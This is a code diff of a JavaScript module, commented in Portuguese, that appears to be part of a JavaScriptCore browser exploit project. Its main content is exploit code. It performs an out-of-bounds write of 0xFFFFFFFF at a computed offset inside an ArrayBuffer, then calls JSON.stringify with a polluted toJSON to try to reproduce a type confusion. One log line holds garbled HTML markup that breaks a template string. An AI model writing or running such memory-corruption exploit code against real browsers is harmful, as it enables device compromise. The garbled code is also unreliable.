@@ -9,14 +9,14 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_V32 = "MinimalTCReplication_v32";
+// A constante é exportada como FNAME_MODULE_V32
+export const FNAME_MODULE_V32 = "MinimalTCReplication_v32"; 
 
 const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF; 
 const VICTIM_AB_SIZE = 64;
 
 let tc_replication_results_v32 = null;
 
-// toJSON ultra-minimalista, apenas para obter o tipo de 'this'
 function toJSON_MinimalTypeCheck_v32() {
     tc_replication_results_v32 = {
         toJSON_executed: "toJSON_MinimalTypeCheck_v32",
@@ -31,7 +31,9 @@ function toJSON_MinimalTypeCheck_v32() {
     return tc_replication_results_v32; 
 }
 
-export async function executeMinimalTCReplicationTest_v32() {
+// A função exportada foi executeMinimalTCReplicationTest_v31 na sua solicitação anterior,
+// mas o módulo é v32. Vou manter o nome da função como _v32 para consistência interna.
+export async function executeMinimalTCReplicationTest_v32() { 
     const FNAME_CURRENT_TEST = `${FNAME_MODULE_V32}.replicateTC`;
     logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Tentando Replicar Type Confusion de v26 ---`, "test", FNAME_CURRENT_TEST);
     document.title = `ReplicateTC_v32`;
@@ -45,9 +47,9 @@ export async function executeMinimalTCReplicationTest_v32() {
     const mLengthOffsetFromConfig = parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
     if (isNaN(mLengthOffsetFromConfig)) {
         logS3("ERRO CRÍTICO: JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET não é um número válido.", "critical", FNAME_CURRENT_TEST);
-        return { /* ... erro ... */ };
+        return { errorOccurred: new Error("Invalid M_LENGTH_OFFSET"), potentiallyCrashed: false, stringifyResult: null, toJSON_details: null };
     }
-    const FAKE_VIEW_BASE_OFFSET_FOR_CALC = 0x58;
+    const FAKE_VIEW_BASE_OFFSET_FOR_CALC = 0x58; 
     const corruptionTargetOffsetInOOBAB = FAKE_VIEW_BASE_OFFSET_FOR_CALC + mLengthOffsetFromConfig; 
 
     try {
@@ -57,8 +59,6 @@ export async function executeMinimalTCReplicationTest_v32() {
         logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
         logS3(`   Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST);
 
-        // PASSO 1: Escrita OOB CRÍTICA em oob_array_buffer_real[corruptionTargetOffsetInOOBAB]
-        // SEM plantação de estrutura fake antes, para replicar v26.
         lastStep = "critical_oob_write";
         logS3(`PASSO 1: Escrevendo valor CRÍTICO <span class="math-inline">\{toHex\(CRITICAL\_OOB\_WRITE\_VALUE\)\} em oob\_array\_buffer\_real\[</span>{toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
         oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
@@ -66,7 +66,6 @@ export async function executeMinimalTCReplicationTest_v32() {
 
         await PAUSE_S3(100);
 
-        // PASSO 2: Criar victim_ab (ArrayBuffer) e tentar JSON.stringify com toJSON poluído
         lastStep = "victim_creation_and_stringify";
         let victim_ab = new ArrayBuffer(VICTIM_AB_SIZE);
         logS3(`PASSO 2: victim_ab (${VICTIM_AB_SIZE} bytes) criado. Tentando JSON.stringify(victim_ab) com ${toJSON_MinimalTypeCheck_v32.name}...`, "test", FNAME_CURRENT_TEST);
@@ -126,7 +125,7 @@ export async function executeMinimalTCReplicationTest_v32() {
     return { 
         errorOccurred: errorCapturedMain, 
         potentiallyCrashed, 
-        stringifyResult: stringifyOutput, // Este será o objeto retornado pela toJSON
-        toJSON_details: tc_replication_results_v32 // Acessando a variável de escopo do módulo
+        stringifyResult: stringifyOutput, 
+        toJSON_details: tc_replication_results_v32 
     };
 }
